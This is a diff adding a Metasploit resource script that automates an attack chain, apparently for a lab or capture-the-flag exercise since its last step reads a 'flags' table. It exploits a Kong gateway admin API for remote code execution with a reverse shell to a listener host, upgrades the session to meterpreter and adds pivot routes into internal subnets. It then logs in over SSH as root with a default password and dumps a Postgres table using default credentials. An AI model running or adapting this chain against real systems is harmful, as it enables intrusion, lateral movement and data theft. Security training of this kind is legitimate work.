@@ -1,0 +1,29 @@
+<ruby>
+def last_session_id
+    framework.sessions.keys.last
+end
+</ruby>
+
+# Exploit the gateway
+use multi/http/kong_gateway_admin_api_rce
+run -z http://172.16.83.2:8001 lhost=172.16.83.1 lport=5000
+
+# Upgrade the last shell to meterpreter
+<ruby>
+run_single("sessions -u #{last_session_id}")
+</ruby>
+
+# Set up porting for both the gateway and webservice subnets
+route add 172.18.101.0/24 -1
+route add 172.18.102.0/24 -1
+
+# SSH into the service running behind the gateway
+use scanner/ssh/ssh_login
+run ssh://root:admin@172.18.102.20
+
+# Set up the final forwarding to the database subnet
+route add 172.18.103.0/24 -1
+
+# Run the postgres module
+use auxiliary/admin/postgres/postgres_sql
+run postgres://admin:admin@172.18.103.30 sql="select * from flags" database='postgres'
